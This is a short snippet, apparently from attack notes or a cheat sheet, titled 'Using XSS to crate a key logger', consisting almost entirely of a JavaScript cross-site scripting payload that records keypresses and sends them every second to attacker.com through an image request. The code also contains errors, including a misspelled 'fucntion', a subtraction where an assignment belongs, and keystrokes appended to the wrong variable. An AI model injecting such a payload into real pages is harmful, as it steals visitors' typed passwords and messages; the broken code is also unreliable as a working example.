***
**Using XSS to crate a key logger**
```html
<script>
var keys='';
var url = 'http://attacker.com/test.php?c=';
document.onkeypress = function(e){
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	key+=key;
}
window.setInterval(fucntion(){
	if(key.length>0){
		new Image().src - url+keys;
		keys = '';
	}
}, 1000);
</script>
```